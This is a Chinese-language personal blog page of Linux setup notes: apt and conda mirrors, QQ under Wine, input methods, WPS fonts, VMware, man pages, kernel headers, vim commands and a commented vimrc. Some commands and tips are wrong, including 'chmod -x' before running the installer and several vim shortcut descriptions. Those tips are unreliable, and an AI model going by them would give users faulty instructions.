class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.local/share/applications</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>之后在applications文件夹里找到相对应的配置文件删除即可</li>\n</ol>\n<h3 id=\"linux换源\"><a href=\"#linux换源\" class=\"headerlink\" title=\"linux换源\"></a>linux换源</h3><ul>\n<li>进入目录  /etc/apt/</li>\n<li>sudo vim source.list</li>\n<li>上网寻找适合自己的源</li>\n</ul>\n<h3 id=\"关于Anaconda的安装\"><a href=\"#关于Anaconda的安装\" class=\"headerlink\" title=\"关于Anaconda的安装\"></a>关于Anaconda的安装</h3><ul>\n<li><p>在清华镜像站下载Anaconda</p>\n</li>\n<li><p>安装后修改环境变量</p>\n<ul>\n<li><p>sudo vim /etc/profile</p>\n</li>\n<li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p>\n<pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p>\n</li>\n<li><p>更换anaconda的源，以清华源举例：</p>\n<ul>\n<li><p>sudo vim ~/.condarc</p>\n</li>\n<li><p>向里面写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">channels:</span><br><span class=\"line\">https://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class=\"line\">https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/</span><br><span class=\"line\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class=\"line\">defaults</span><br><span class=\"line\">show_channel_urls: true</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于qq的安装问题\"><a href=\"#关于qq的安装问题\" class=\"headerlink\" title=\"关于qq的安装问题\"></a>关于qq的安装问题</h3><ul>\n<li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li>\n<li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install xfonts-intl-chinese</span><br><span class=\"line\">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>关于QQ用wine装好后找不到的问题<ul>\n<li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li>\n<li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li>\n<li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li>\n<li>为了方便，可以把QQ/Bin 放到home文件下</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于输入法的问题\"><a href=\"#关于输入法的问题\" class=\"headerlink\" title=\"关于输入法的问题\"></a>关于输入法的问题</h3><ul>\n<li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li>\n<li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li>\n<li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li>\n</ul>\n<h3 id=\"wps字体问题\"><a href=\"#wps字体问题\" class=\"headerlink\" title=\"wps字体问题\"></a>wps字体问题</h3><ul>\n<li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li>\n<li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fc-cache -fv     //识别字体库</span><br><span class=\"line\"></span><br><span class=\"line\">fc-list :lang=zh-cn | sort    //确认是否安装</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"关于vmware-虚拟机安装\"><a href=\"#关于vmware-虚拟机安装\" class=\"headerlink\" title=\"关于vmware 虚拟机安装\"></a>关于vmware 虚拟机安装</h3><ol>\n<li>官网下载虚拟机最新版本</li>\n<li>chmod -x 下载的文件</li>\n<li>sudo bash 下载的文件</li>\n<li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li>\n</ol>\n<h3 id=\"linux-vmware升级问题\"><a href=\"#linux-vmware升级问题\" class=\"headerlink\" title=\"linux-vmware升级问题\"></a>linux-vmware升级问题</h3><p><a href=\"https://www.cnblogs.com/wjshan0808/p/4110495.html\">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># vmware-uninstall </span><br><span class=\"line\">You have gotten this message because you are either downgrading VMware</span><br><span class=\"line\">Workstation, Player, or VIX, or because you attempted to run either</span><br><span class=\"line\">vmware-uninstall or vmware-uninstall-vix.</span><br><span class=\"line\"></span><br><span class=\"line\">If you are downgrading, please uninstall all newer versions first, then</span><br><span class=\"line\">install again.</span><br><span class=\"line\"></span><br><span class=\"line\">The vmware-uninstall* scripts have been deprecated.  Instead, please use</span><br><span class=\"line\">the vmware-installer.</span><br><span class=\"line\"></span><br><span class=\"line\">Long form:</span><br><span class=\"line\">      vmware-installer --uninstall-product PRODUCT</span><br><span class=\"line\">Short form:</span><br><span class=\"line\">      vmware-installer -u PRODUCT</span><br><span class=\"line\"></span><br><span class=\"line\">Where PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.</span><br><span class=\"line\"></span><br><span class=\"line\">For a list of which products are installed, you may run:</span><br><span class=\"line\">      vmware-installer --list-products</span><br><span class=\"line\">or:</span><br><span class=\"line\">      vmware-installer -l</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># vmware-installer -l</span><br><span class=\"line\">Product Name         Product Version     </span><br><span class=\"line\">==================== ====================</span><br><span class=\"line\">vmware-workstation   10.0.4.2249910      </span><br><span class=\"line\"># vmware-installer -u vmware-workstation</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"man-中文手册下载\"><a href=\"#man-中文手册下载\" class=\"headerlink\" title=\"man 中文手册下载\"></a>man 中文手册下载</h3><ol>\n<li>Debian / Ubuntu安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install manpages-zh</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>Arch Linux:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pacman -Syu</span><br><span class=\"line\">pacman -S man-pages-zh_cn man-pages-zh_tw</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>Red Hat / CentOS:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update</span><br><span class=\"line\">yum install man-pages-zh-CN</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>Fedora:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf update</span><br><span class=\"line\">dnf install man-pages-zh-CN</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"kali内核更新安装\"><a href=\"#kali内核更新安装\" class=\"headerlink\" title=\"kali内核更新安装\"></a>kali内核更新安装</h3><ol>\n<li>查看内核版本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname -r</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>检查linux是否安装对应的头文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-cache search linux-headers</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装更新头文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>内核头文件检测是否安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg-query -s linux-headers-`uname -r`</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"vim命令\"><a href=\"#vim命令\" class=\"headerlink\" title=\"vim命令\"></a>vim命令</h3><ol>\n<li>:set number 显示行号</li>\n<li>:set 取消行号</li>\n<li>xG:跳转到指定的第x行，G移动到文件末尾行</li>\n<li>dd ：剪切一行， yy：复制一行</li>\n<li>D：剪切一个字符，y：复制一个字符</li>\n<li>p：粘贴</li>\n<li>dxw：删除光标右边x个字符</li>\n<li>dxh：删除光标左边x个字符</li>\n<li>:x 删除一个字符</li>\n<li>/string :查找字符 n:向上查找，N：向下查找</li>\n<li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li>\n</ol>\n<ul>\n<li>vim规则总结</li>\n</ul>\n<p>（1）一般是操作字符+被操作的量</p>\n<p>（2）$ 为结尾， 0 为开头</p>\n<ul>\n<li><p>vim简单配置：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;===================</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>适合自己用的vimrc配置文件</span><br><span class=\"line\"><span class=\"string\">&quot;===================</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>设置编码</span><br><span class=\"line\"><span class=\"built_in\">set</span> fileencodings=utf<span class=\"number\">-8</span>,ucs-bom,gb18030,gbk,gb2312,cp936</span><br><span class=\"line\"><span class=\"built_in\">set</span> termencoding=utf<span class=\"number\">-8</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> encoding=utf<span class=\"number\">-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;保存.vimrc文件时自动重启加载，即让此文件立即生效</span></span><br><span class=\"line\"><span class=\"string\">autocmd BufWritePost $MYVIMRC source $MYVIMRC</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>语法高亮</span><br><span class=\"line\">syntax on</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> ruler</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.</span><br><span class=\"line\"><span class=\"string\">&quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.</span></span><br><span class=\"line\"><span class=\"string\">set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %&#123;strftime(\\&quot;%H:%M\\&quot;)&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>显示行号</span><br><span class=\"line\"><span class=\"built_in\">set</span> nu <span class=\"string\">&quot;等同于 set number</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>突出显示当前行</span><br><span class=\"line\"><span class=\"built_in\">set</span> cursorline <span class=\"string\">&quot;等同于 set cul</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>突出显示当前列</span><br><span class=\"line\"><span class=\"built_in\">set</span> cursorcolumn <span class=\"string\">&quot;等同于 set cuc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>共享剪贴板  </span><br><span class=\"line\"><span class=\"built_in\">set</span> clipboard+=unnamed </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;从不备份  </span></span><br><span class=\"line\"><span class=\"string\">set nobackup</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动保存</span><br><span class=\"line\"><span class=\"built_in\">set</span> autowrite</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;隐藏工具栏</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> guioptions-=T</span><br><span class=\"line\"><span class=\"string\">&quot;隐藏菜单栏</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> guioptions-=m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> hlsearch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;光标立刻跳转到搜索到内容</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> incsearch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> nowrapscan</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;去掉输入错误时的提示声音</span></span><br><span class=\"line\"><span class=\"string\">set noeb</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> 默认按下Esc后,需要等待<span class=\"number\">1</span>秒才生效,设置Esc超时时间为<span class=\"number\">100</span>ms,尽快生效</span><br><span class=\"line\"><span class=\"built_in\">set</span> ttimeout</span><br><span class=\"line\"><span class=\"built_in\">set</span> ttimeoutlen=<span class=\"number\">100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;在处理未保存或只读文件的时候，弹出确认</span></span><br><span class=\"line\"><span class=\"string\">set confirm</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>让Backspace键可以往前删除字符.</span><br><span class=\"line\"><span class=\"string\">&quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,</span><br><span class=\"line\"><span class=\"string\">&quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>使回格键（backspace）正常处理indent, eol, start等</span><br><span class=\"line\"><span class=\"built_in\">set</span> backspace=indent,eol,start</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;允许backspace和光标键跨越行边界</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> whichwrap+=&lt;,&gt;,h,l</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;去掉有关vi一致性模式,避免操作习惯上的局限.</span></span><br><span class=\"line\"><span class=\"string\">set nocompatible</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置</span><br><span class=\"line\"><span class=\"string\">&quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现</span><br><span class=\"line\"><span class=\"string\">&quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a</span><br><span class=\"line\"><span class=\"built_in\">set</span> mouse=n</span><br><span class=\"line\"><span class=\"string\">&quot;set selection=exclusive</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> selectmode=mouse,key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;高亮显示括号匹配</span></span><br><span class=\"line\"><span class=\"string\">set showmatch</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>设置Tab长度为<span class=\"number\">4</span>空格</span><br><span class=\"line\"><span class=\"built_in\">set</span> tabstop=<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"string\">&quot;设置自动缩进长度为4空格</span></span><br><span class=\"line\"><span class=\"string\">set shiftwidth=4</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置</span><br><span class=\"line\"><span class=\"string\">&quot;set autoindent</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>不要用空格代替制表符</span><br><span class=\"line\"><span class=\"built_in\">set</span> noexpandtab</span><br><span class=\"line\"><span class=\"string\">&quot;输入tab制表符时，自动替换成空格</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"built_in\">set</span> expandtab</span><br><span class=\"line\"><span class=\"string\">&quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.</span><br><span class=\"line\"><span class=\"string\">&quot;set softtabstop=4</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>显示空格和tab键</span><br><span class=\"line\"><span class=\"built_in\">set</span> listchars=tab:&gt;-,trail:-</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名</span></span><br><span class=\"line\"><span class=\"string\">set laststatus=2</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>自动补全</span><br><span class=\"line\">:inoremap ( ()&lt;ESC&gt;i</span><br><span class=\"line\">:inoremap ) &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;)&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class=\"line\">:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;&#125;&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap [ []&lt;ESC&gt;i</span><br><span class=\"line\">:inoremap ] &lt;c-r&gt;=ClosePair(<span class=\"string\">&#x27;]&#x27;</span>)&lt;CR&gt;</span><br><span class=\"line\">:inoremap <span class=\"string\">&quot; &quot;</span><span class=\"string\">&quot;&lt;ESC&gt;i</span></span><br><span class=\"line\"><span class=\"string\">:inoremap &#x27; &#x27;&#x27;&lt;ESC&gt;i</span></span><br><span class=\"line\"><span class=\"string\">function! ClosePair(char)</span></span><br><span class=\"line\"><span class=\"string\">    if getline(&#x27;.&#x27;)[col(&#x27;.&#x27;) - 1] == a:char</span></span><br><span class=\"line\"><span class=\"string\">        return &quot;</span>\\&lt;Right&gt;<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">    else</span></span><br><span class=\"line\"><span class=\"string\">        return a:char</span></span><br><span class=\"line\"><span class=\"string\">    endif</span></span><br><span class=\"line\"><span class=\"string\">endfunction </span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文</span><br><span class=\"line\">filetype plugin indent on</span><br><span class=\"line\"><span class=\"string\">&quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.</span><br><span class=\"line\"><span class=\"string\">&quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> 麻烦,不做设置,保持默认设置,vim默认没有设置longest.</span><br><span class=\"line\"><span class=\"string\">&quot;set completeopt=longest,menu &quot;</span>启用这句才会开启自动补全</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;=============显示中文帮助</span></span><br><span class=\"line\"><span class=\"string\">if version &gt;= 603</span></span><br><span class=\"line\"><span class=\"string\">    set helplang=cn</span></span><br><span class=\"line\"><span class=\"string\">    set encoding=utf-8</span></span><br><span class=\"line\"><span class=\"string\">endif</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>=============新建.c,.h,.sh,.java文件，自动插入文件头 </span><br><span class=\"line\">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec <span class=\"string\">&quot;:call SetTitle()&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span>定义函数SetTitle，自动插入文件头 </span><br><span class=\"line\">func SetTitle() </span><br><span class=\"line\">    <span class=\"string\">&quot;如果文件类型为.sh文件 </span></span><br><span class=\"line\"><span class=\"string\">    if &amp;filetype == &#x27;sh&#x27; </span></span><br><span class=\"line\"><span class=\"string\">        call setline(1,&quot;</span>\\############################<span class=\"string\">&quot;) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;), &quot;</span>\\# File Name: <span class=\"string\">&quot;.expand(&quot;</span>%<span class=\"string\">&quot;)) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;)+1, &quot;</span>\\# Author: Li Ziqiang<span class=\"string\">&quot;) </span></span><br><span class=\"line\"><span class=\"string\">        call append(line(&quot;</span>.<span class=\"string\">&quot;)+2, &quot;</span>\\<span class=\"meta\"># mail: 2296557984@qq.com<span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+3, &quot;</span>\\# Created Time: <span class=\"meta-string\">&quot;.strftime(&quot;</span>%c<span class=\"meta-string\">&quot;))</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+4, &quot;</span>\\############################<span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+5, &quot;</span>\\#!/bin/bash<span class=\"meta-string\">&quot;) 